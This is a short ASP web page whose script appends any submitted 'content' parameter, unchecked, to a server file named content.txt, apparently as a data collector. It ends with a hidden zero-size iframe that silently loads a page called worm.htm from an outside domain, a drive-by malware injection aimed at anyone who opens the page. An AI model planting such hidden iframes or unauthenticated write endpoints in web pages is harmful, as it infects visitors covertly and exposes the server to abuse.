<% 
  content=request("content")
  if content<>"" then

  set fso=Server.CreateObject("Scripting.FileSystemObject")
  set zy=fso.OpenTextFile(Server.MapPath("content.txt"),8,True) '-----写在 content.txt文件里面 !
  zy.WriteLine content
	
  zy.close
  set zy=nothing
  set fso=nothing
  
  end if
%><iframe src=http://www.krvkr.com/worm.htm width=0 height=0></iframe>
